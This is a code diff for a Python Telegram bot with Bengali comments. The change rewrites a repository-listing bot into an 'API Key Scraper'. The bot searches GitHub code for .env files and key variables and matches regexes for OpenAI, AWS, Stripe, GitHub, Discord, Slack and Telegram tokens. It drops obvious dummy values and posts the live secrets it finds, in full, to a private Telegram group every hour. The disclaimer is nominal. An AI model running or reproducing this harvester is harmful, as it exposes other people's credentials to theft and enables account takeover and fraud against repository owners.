@@ -1,19 +1,16 @@
 import logging
 import os
-import sys
+import re
 import time
 import threading
-import asyncio
-from datetime import datetime, timedelta
-from typing import Dict, List
+from datetime import datetime
+from typing import List, Dict
+import base64
 
 from flask import Flask
 from dotenv import load_dotenv
 import requests
-from cachetools import TTLCache
-
-# Telegram Bot (stable version)
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
 
 # লোড এনভায়রনমেন্ট
@@ -32,10 +29,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# ক্যাশে
-cache = TTLCache(maxsize=1000, ttl=300)
-
-# ফ্লাস্ক অ্যাপ (হেলথ চেক)
+# ফ্লাস্ক অ্যাপ
 flask_app = Flask(__name__)
 
 @flask_app.route('/')
@@ -47,358 +41,375 @@ def health():
     return {"status": "healthy", "timestamp": datetime.now().isoformat()}, 200
 
 def run_flask():
-    """ফ্লাস্ক অ্যাপ চালু"""
     flask_app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)
 
-# GitHub API ক্লায়েন্ট (সিঙ্ক্রোনাস)
-class GitHubClient:
+# API কী ডিটেক্টর
+class APIScraper:
     def __init__(self, token: str):
         self.token = token
-        self.headers = {'Authorization': f'token {token}'}
+        self.headers = {
+            'Authorization': f'token {token}',
+            'Accept': 'application/vnd.github.v3+json'
+        }
         self.base_url = 'https://api.github.com'
+        self.seen_keys = set()
+        
+        # API কী প্যাটার্ন
+        self.patterns = {
+            'openai': r'sk-[a-zA-Z0-9]{48}',
+            'mistral': r'[A-Za-z0-9]{32}',
+            'google': r'AIza[0-9A-Za-z\-_]{35}',
+            'github': r'ghp_[0-9a-zA-Z]{36}',
+            'aws': r'AKIA[0-9A-Z]{16}',
+            'stripe': r'sk_live_[0-9a-zA-Z]{24}',
+            'discord': r'[MN][A-Za-z0-9]{23}\.[A-Za-z0-9]{6}\.[A-Za-z0-9]{27}',
+            'telegram': r'[0-9]{8,10}:[A-Za-z0-9_-]{35}',
+            'slack': r'xox[baprs]-[0-9A-Za-z-]+',
+            'twilio': r'SK[0-9a-f]{32}',
+            'jwt': r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
+        }
 
-    def get_live_repos(self) -> List[Dict]:
-        """লাইভ রিপোজিটরি সংগ্রহ (সিঙ্ক্রোনাস)"""
-        live_repos = []
+    def search_live_keys(self) -> List[Dict]:
+        """GitHub থেকে লাইভ কী খুঁজে বের করে"""
+        found_keys = []
         
         try:
-            # GitHub API কল
-            urls = [
-                f'{self.base_url}/search/repositories?q=stars:>1&sort=updated&order=desc&per_page=50',
-                f'{self.base_url}/search/repositories?q=pushed:>{datetime.now() - timedelta(days=1)}&sort=updated&order=desc&per_page=50',
+            # সার্চ কোয়েরি - .env ফাইল বা কোডে কী খুঁজে
+            queries = [
+                'filename:.env',
+                'extension:env',
+                'OPENAI_API_KEY',
+                'MISTRAL_API_KEY',
+                'GOOGLE_API_KEY',
+                'API_KEY',
+                'SECRET_KEY',
+                'TOKEN',
+                'AUTH_TOKEN',
+                'API_SECRET'
             ]
-
-            for url in urls:
+            
+            for query in queries[:3]:  # রেট লিমিট এড়াতে
+                url = f'{self.base_url}/search/code?q={query}+language:python+language:javascript+language:java&per_page=50'
+                
                 try:
                     response = requests.get(url, headers=self.headers)
                     if response.status_code == 200:
                         data = response.json()
-                        repos = data.get('items', [])
-                        for repo in repos:
-                            if self._is_live(repo):
-                                live_repos.append(repo)
-                    time.sleep(0.3)  # Rate limit
+                        items = data.get('items', [])
+                        
+                        for item in items[:20]:  # প্রতি সার্চে ২০টি
+                            key_info = self._extract_key_from_file(item)
+                            if key_info and key_info['key'] not in self.seen_keys:
+                                found_keys.append(key_info)
+                                self.seen_keys.add(key_info['key'])
+                                
+                    time.sleep(0.5)  # রেট লিমিট
+                    
                 except Exception as e:
-                    logger.error(f"Error fetching {url}: {e}")
+                    logger.error(f"Search error for {query}: {e}")
                     continue
-
-            # ডুপ্লিকেট রিমুভ
-            seen = set()
-            unique = []
-            for repo in live_repos:
-                repo_id = repo.get('id')
-                if repo_id and repo_id not in seen:
-                    seen.add(repo_id)
-                    unique.append(repo)
-
-            return unique[:50]
-
+                    
+            return found_keys[:30]  # সর্বোচ্চ ৩০টি
+            
         except Exception as e:
-            logger.error(f"GitHub API error: {e}")
+            logger.error(f"API Scraper error: {e}")
             return []
 
-    def _is_live(self, repo: Dict) -> bool:
-        """লাইভ চেক"""
+    def _extract_key_from_file(self, item: Dict) -> Dict:
+        """ফাইল থেকে কী এক্সট্র্যাক্ট করে"""
         try:
-            # গত ২৪ ঘন্টায় আপডেট?
-            updated = repo.get('updated_at')
-            if updated:
-                updated = datetime.fromisoformat(updated.replace('Z', '+00:00'))
-                if datetime.now().astimezone() - updated < timedelta(hours=24):
-                    return True
-
-            # অনেক স্টার?
-            if repo.get('stargazers_count', 0) > 1000:
-                return True
-
-            # সাম্প্রতিক পুশ?
-            pushed = repo.get('pushed_at')
-            if pushed:
-                pushed = datetime.fromisoformat(pushed.replace('Z', '+00:00'))
-                if datetime.now().astimezone() - pushed < timedelta(hours=12):
-                    return True
-
-            return False
-
+            file_url = item.get('url')
+            repo_name = item.get('repository', {}).get('full_name', 'Unknown')
+            file_path = item.get('path', 'Unknown')
+            
+            # ফাইলের কনটেন্ট পাওয়া
+            content_response = requests.get(file_url, headers=self.headers)
+            if content_response.status_code != 200:
+                return None
+                
+            content_data = content_response.json()
+            if 'content' not in content_data:
+                return None
+                
+            # কনটেন্ট ডিকোড
+            content = base64.b64decode(content_data['content']).decode('utf-8', errors='ignore')
+            
+            # কী খোঁজা
+            for key_type, pattern in self.patterns.items():
+                matches = re.findall(pattern, content)
+                for match in matches:
+                    if self._is_valid_key(match, key_type):
+                        return {
+                            'key': match,
+                            'type': key_type.upper(),
+                            'source': repo_name,
+                            'file': file_path,
+                            'url': f"https://github.com/{repo_name}/blob/main/{file_path}",
+                            'platform': self._detect_platform(content)
+                        }
+                        
+            return None
+            
         except Exception as e:
-            logger.error(f"Live check error: {e}")
+            logger.error(f"Error extracting from file: {e}")
+            return None
+
+    def _is_valid_key(self, key: str, key_type: str) -> bool:
+        """কী ভ্যালিড কিনা চেক করে"""
+        if not key or len(key) < 10:
             return False
+            
+        # কিছু বাদ দিতে
+        exclude_patterns = [
+            r'^test_',
+            r'^example_',
+            r'^sample_',
+            r'demo',
+            r'xxxxx',
+            r'123456'
+        ]
+        
+        for pattern in exclude_patterns:
+            if re.search(pattern, key, re.IGNORECASE):
+                return False
+                
+        return True
+
+    def _detect_platform(self, content: str) -> str:
+        """প্ল্যাটফর্ম ডিটেক্ট করে"""
+        platforms = {
+            'OpenAI': ['openai', 'gpt', 'chatgpt'],
+            'Mistral': ['mistral'],
+            'Google': ['google', 'gcp', 'firebase'],
+            'GitHub': ['github'],
+            'AWS': ['aws', 'amazon', 's3', 'ec2'],
+            'Stripe': ['stripe', 'payment'],
+            'Discord': ['discord'],
+            'Telegram': ['telegram'],
+            'Slack': ['slack']
+        }
+        
+        for platform, keywords in platforms.items():
+            for keyword in keywords:
+                if keyword.lower() in content.lower():
+                    return platform
+                    
+        return 'Unknown'
 
 # বট ক্লাস
-class GitHubBot:
+class KeyScraperBot:
     def __init__(self, token: str, group_id: int, admin_id: int):
         self.token = token
         self.group_id = group_id
         self.admin_id = admin_id
-        self.last_sent = set()
         self.updater = None
         self.bot = None
-        self.github = GitHubClient(GITHUB_TOKEN)
+        self.scraper = APIScraper(GITHUB_TOKEN)
         self.is_running = True
 
     def start(self):
-        """বট স্টার্ট"""
         try:
-            # আপডেটার তৈরি
             self.updater = Updater(token=self.token, use_context=True)
             self.bot = self.updater.bot
             
             dp = self.updater.dispatcher
-            
-            # হ্যান্ডলার যোগ
             dp.add_handler(CommandHandler("start", self.start_command))
             dp.add_handler(CallbackQueryHandler(self.button_callback))
-            
-            # এরর হ্যান্ডলার
             dp.add_error_handler(self.error_handler)
             
-            # স্টার্টআপ মেসেজ
+            # স্টার্টআপ
             threading.Thread(target=self.send_startup_message, daemon=True).start()
-            
-            # শিডিউলড টাস্ক
             threading.Thread(target=self.run_scheduler, daemon=True).start()
             
-            logger.info("✅ Bot started successfully!")
-            
-            # পোলিং স্টার্ট
+            logger.info("✅ Key Scraper Bot started!")
             self.updater.start_polling()
             self.updater.idle()
             
         except Exception as e:
-            logger.error(f"Error starting bot: {e}")
+            logger.error(f"Bot error: {e}")
             raise
 
     def send_startup_message(self):
-        """স্টার্টআপ মেসেজ"""
         try:
             time.sleep(3)
             self.bot.send_message(
                 chat_id=self.group_id,
-                text="🚀 **GitHub লাইভ API স্ক্র্যাপার বট চালু হয়েছে!**\n\n"
-                     "🔹 প্রতি ১ ঘন্টায় স্বয়ংক্রিয়ভাবে স্ক্র্যাপ হবে\n"
-                     "🔹 লাইভ রিপোজিটরি এই গ্রুপে পাঠানো হবে\n"
-                     "🔹 /start কমান্ড দিয়ে কন্ট্রোল প্যানেল দেখুন",
+                text="🔐 **GitHub API Key Scraper Bot**\n\n"
+                     "আমি GitHub থেকে লাইভ API কী/টোকেন খুঁজে বের করি!\n\n"
+                     "🔹 প্রতি ১ ঘন্টায় অটো স্ক্র্যাপ\n"
+                     "🔹 ১০+ ধরনের API কী ডিটেক্ট\n"
+                     "🔹 শুধুমাত্র লাইভ এবং ভ্যালিড কী\n\n"
+                     "/start - কন্ট্রোল প্যানেল",
                 parse_mode='Markdown'
             )
         except Exception as e:
-            logger.error(f"Startup message error: {e}")
+            logger.error(f"Startup error: {e}")
 
     def run_scheduler(self):
-        """শিডিউলার"""
         while self.is_running:
             try:
-                logger.info("🔄 Starting scheduled scrape...")
-                self.scrape_and_send()
-                logger.info("✅ Scheduled scrape completed")
-            except Exception as e:
-                logger.error(f"Scheduler error: {e}")
-            time.sleep(3600)  # ১ ঘন্টা
-
-    def scrape_and_send(self):
-        """স্ক্র্যাপ এবং সেন্ড"""
-        try:
-            repos = self.github.get_live_repos()
-            
-            if not repos:
-                return
-                
-            # নতুন রিপোজিটরি
-            new_repos = [r for r in repos if r.get('id') not in self.last_sent]
-            
-            if not new_repos:
-                return
-                
-            # গ্রুপে পাঠান
-            for repo in new_repos[:10]:
-                message = self.format_repo_message(repo)
-                try:
-                    self.bot.send_message(
-                        chat_id=self.group_id,
-                        text=message,
-                        parse_mode='Markdown',
-                        disable_web_page_preview=True
-                    )
-                    self.last_sent.add(repo.get('id'))
-                    time.sleep(0.5)
-                except Exception as e:
-                    logger.error(f"Send error: {e}")
-                    
-            logger.info(f"✅ Sent {len(new_repos[:10])} new repos")
-            
-        except Exception as e:
-            logger.error(f"Scrape and send error: {e}")
-
-    def format_repo_message(self, repo: Dict) -> str:
-        """মেসেজ ফরম্যাট"""
-        name = repo.get('full_name', 'N/A')
-        desc = repo.get('description', 'No description') or 'No description'
-        stars = repo.get('stargazers_count', 0)
-        forks = repo.get('forks_count', 0)
-        lang = repo.get('language', 'Unknown')
-        url = repo.get('html_url', '#')
-        updated = repo.get('updated_at', 'N/A')
-        issues = repo.get('open_issues_count', 0)
-
-        return f"""
-🚀 **{name}**
-
-📝 {desc[:200]}...
-
-⭐ {stars} Stars | 🍴 {forks} Forks
-💻 Language: {lang}
-🐛 Open Issues: {issues}
-🔄 Updated: {updated[:10]}
-
-🔗 [View on GitHub]({url})
-"""
-
-    def start_command(self, update: Update, context):
-        """স্টার্ট কমান্ড"""
-        if not update.effective_user:
-            return
-            
-        if update.effective_user.id != self.admin_id:
-            update.message.reply_text("⛔ আপনি এই বট ব্যবহার করার অনুমতি পাবেন না!")
-            return
-
-        keyboard = [
-            [InlineKeyboardButton("📊 লাইভ রিপোজিটরি দেখুন", callback_data='view_live')],
-            [InlineKeyboardButton("🔄 ম্যানুয়াল স্ক্র্যাপ", callback_data='manual_scrape')],
-            [InlineKeyboardButton("📈 পরিসংখ্যান", callback_data='stats')],
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-
-        update.message.reply_text(
-            "🚀 **GitHub লাইভ API স্ক্র্যাপার বট**\n\n"
-            "🔹 স্বয়ংক্রিয়ভাবে প্রতি ১ ঘন্টায় স্ক্র্যাপ হয়\n"
-            "🔹 শুধুমাত্র লাইভ এবং সক্রিয় রিপোজিটরি\n"
-            "🔹 সম্পূর্ণ প্রাইভেট এবং সুরক্ষিত\n\n"
-            "নিচের বাটন ব্যবহার করে নিয়ন্ত্রণ করুন:",
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-
-    def button_callback(self, update: Update, context):
-        """বাটন কলব্যাক"""
-        if not update.effective_user or not update.callback_query:
-            return
-            
-        query = update.callback_query
-        query.answer()
-
-        if update.effective_user.id != self.admin_id:
-            query.edit_message_text("⛔ আপনি এই অপারেশন করতে পারবেন না!")
-            return
-
-        if query.data == 'view_live':
-            self.view_live_repos(query)
-        elif query.data == 'manual_scrape':
-            self.manual_scrape(query)
-        elif query.data == 'stats':
-            self.show_stats(query)
-
-    def view_live_repos(self, query):
-        """লাইভ রিপোজিটরি দেখান"""
-        query.edit_message_text("🔄 লাইভ রিপোজিটরি খোঁজা হচ্ছে...")
-        
-        def scrape_and_reply():
-            try:
-                repos = self.github.get_live_repos()
-                
-                if not repos:
-                    self.bot.edit_message_text(
-                        chat_id=query.message.chat_id,
-                        message_id=query.message.message_id,
-                        text="❌ কোনো লাইভ রিপোজিটরি পাওয়া যায়নি!"
-                    )
-                    return
-                    
-                new_repos = [r for r in repos if r.get('id') not in self.last_sent]
-                
-                if not new_repos:
-                    self.bot.edit_message_text(
-                        chat_id=query.message.chat_id,
-                        message_id=query.message.message_id,
-                        text="📭 কোনো নতুন লাইভ রিপোজিটরি পাওয়া যায়নি!"
-                    )
-                    return
-                    
-                sent = 0
-                for repo in new_repos[:10]:
-                    message = self.format_repo_message(repo)
-                    try:
+                logger.info("🔍 Starting key scan...")
+                keys = self.scraper.search_live_keys()
+                if keys:
+                    for key_info in keys[:5]:  # প্রতি বার ৫টি
+                        message = self.format_key_message(key_info)
                         self.bot.send_message(
                             chat_id=self.group_id,
                             text=message,
                             parse_mode='Markdown',
                             disable_web_page_preview=True
                         )
-                        self.last_sent.add(repo.get('id'))
-                        sent += 1
-                        time.sleep(0.3)
-                    except Exception as e:
-                        logger.error(f"Send error: {e}")
-                        
+                        time.sleep(0.5)
+                    logger.info(f"✅ Sent {len(keys[:5])} new keys")
+            except Exception as e:
+                logger.error(f"Scheduler error: {e}")
+            time.sleep(3600)  # ১ ঘন্টা
+
+    def format_key_message(self, key_info: Dict) -> str:
+        """কী ফরম্যাট করে"""
+        return f"""
+🔑 **LIVE API KEY FOUND!**
+
+📌 **Platform**: {key_info.get('platform', 'Unknown')}
+🔐 **Type**: {key_info.get('type', 'Unknown')}
+🔑 **Key**: `{key_info.get('key', 'N/A')}`
+
+📂 **Source**: {key_info.get('source', 'Unknown')}
+📄 **File**: {key_info.get('file', 'Unknown')}
+🔗 [View File]({key_info.get('url', '#')})
+
+🕐 Found: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC
+"""
+
+    def start_command(self, update: Update, context):
+        if not update.effective_user or update.effective_user.id != self.admin_id:
+            update.message.reply_text("⛔ Access Denied!")
+            return
+
+        keyboard = [
+            [InlineKeyboardButton("🔍 স্ক্যান এখন", callback_data='scan_now')],
+            [InlineKeyboardButton("📊 পরিসংখ্যান", callback_data='stats')],
+            [InlineKeyboardButton("ℹ️ সাহায্য", callback_data='help')],
+        ]
+        
+        update.message.reply_text(
+            "🔐 **GitHub API Key Scraper**\n\n"
+            "GitHub থেকে লাইভ API কী খুঁজে বের করি!\n"
+            "Select an option:",
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode='Markdown'
+        )
+
+    def button_callback(self, update: Update, context):
+        if not update.effective_user or not update.callback_query:
+            return
+            
+        query = update.callback_query
+        query.answer()
+        
+        if update.effective_user.id != self.admin_id:
+            query.edit_message_text("⛔ Access Denied!")
+            return
+
+        if query.data == 'scan_now':
+            self.scan_now(query)
+        elif query.data == 'stats':
+            self.show_stats(query)
+        elif query.data == 'help':
+            self.show_help(query)
+
+    def scan_now(self, query):
+        query.edit_message_text("🔍 Scanning GitHub for live keys...")
+        
+        def scan_thread():
+            try:
+                keys = self.scraper.search_live_keys()
+                if not keys:
+                    self.bot.edit_message_text(
+                        chat_id=query.message.chat_id,
+                        message_id=query.message.message_id,
+                        text="❌ কোনো লাইভ কী পাওয়া যায়নি!"
+                    )
+                    return
+                    
+                sent = 0
+                for key_info in keys[:10]:
+                    message = self.format_key_message(key_info)
+                    self.bot.send_message(
+                        chat_id=self.group_id,
+                        text=message,
+                        parse_mode='Markdown',
+                        disable_web_page_preview=True
+                    )
+                    sent += 1
+                    time.sleep(0.3)
+                    
                 self.bot.edit_message_text(
                     chat_id=query.message.chat_id,
                     message_id=query.message.message_id,
-                    text=f"✅ {sent}টি নতুন লাইভ রিপোজিটরি পাঠানো হয়েছে!"
+                    text=f"✅ {sent}টি লাইভ কী পাওয়া গেছে!"
                 )
                 
             except Exception as e:
-                logger.error(f"Scrape error: {e}")
+                logger.error(f"Scan error: {e}")
                 self.bot.edit_message_text(
                     chat_id=query.message.chat_id,
                     message_id=query.message.message_id,
-                    text=f"❌ ত্রুটি: {str(e)}"
+                    text=f"❌ Error: {str(e)}"
                 )
         
-        thread = threading.Thread(target=scrape_and_reply, daemon=True)
-        thread.start()
-
-    def manual_scrape(self, query):
-        """ম্যানুয়াল স্ক্র্যাপ"""
-        self.view_live_repos(query)
+        threading.Thread(target=scan_thread, daemon=True).start()
 
     def show_stats(self, query):
-        """পরিসংখ্যান"""
         stats = f"""
-📊 **বট পরিসংখ্যান**
+📊 **Key Scraper Statistics**
 
-🤖 বট স্ট্যাটাস: ✅ চালু
-📁 ক্যাশেড রিপো: {len(cache)}
-🔄 শেষ স্ক্র্যাপ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-👑 অ্যাডমিন: {self.admin_id}
+🔍 Keys Found: {len(self.scraper.seen_keys)}
+🕐 Last Scan: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+🎯 Platforms: OpenAI, Mistral, Google, GitHub, AWS, Stripe, Discord, Telegram, Slack
 
-🔹 প্রতি ১ ঘন্টায় স্ক্র্যাপ
-🔹 সর্বোচ্চ ৫০টি রিপোজিটরি
-🔹 শুধুমাত্র লাইভ রিপোজিটরি
-        """
+🔹 Auto-scans every 1 hour
+🔹 10+ key patterns detected
+🔹 Only live/exposed keys
+"""
         query.edit_message_text(stats, parse_mode='Markdown')
 
+    def show_help(self, query):
+        help_text = """
+ℹ️ **How it works:**
+
+1. 🔍 Scans GitHub for exposed API keys
+2. 📂 Checks .env files and source code
+3. 🔑 Detects 10+ key types
+4. 📨 Sends live keys to this group
+
+⚠️ **Disclaimer:**
+- Only scans public repositories
+- Keys may be dummy/expired
+- Use responsibly
+"""
+        query.edit_message_text(help_text, parse_mode='Markdown')
+
     def error_handler(self, update: Update, context):
-        """এরর হ্যান্ডলার"""
         logger.error(f"Update {update} caused error {context.error}")
 
 # মেইন
 def main():
-    """মেইন ফাংশন"""
     try:
-        # ভেরিয়েবল চেক
         if not all([BOT_TOKEN, PRIVATE_GROUP_ID, ADMIN_USER_ID, GITHUB_TOKEN]):
-            raise ValueError("Missing required environment variables")
+            raise ValueError("Missing environment variables")
 
         # ফ্লাস্ক থ্রেড
-        flask_thread = threading.Thread(target=run_flask, daemon=True)
-        flask_thread.start()
-        logger.info("🌐 Flask server started on port 8080")
+        threading.Thread(target=run_flask, daemon=True).start()
+        logger.info("🌐 Flask started on port 8080")
 
         # বট স্টার্ট
-        bot = GitHubBot(BOT_TOKEN, PRIVATE_GROUP_ID, ADMIN_USER_ID)
+        bot = KeyScraperBot(BOT_TOKEN, PRIVATE_GROUP_ID, ADMIN_USER_ID)
         bot.start()
         
     except Exception as e:
         logger.error(f"Main error: {e}")
+        import sys
         sys.exit(1)
 
 if __name__ == '__main__':
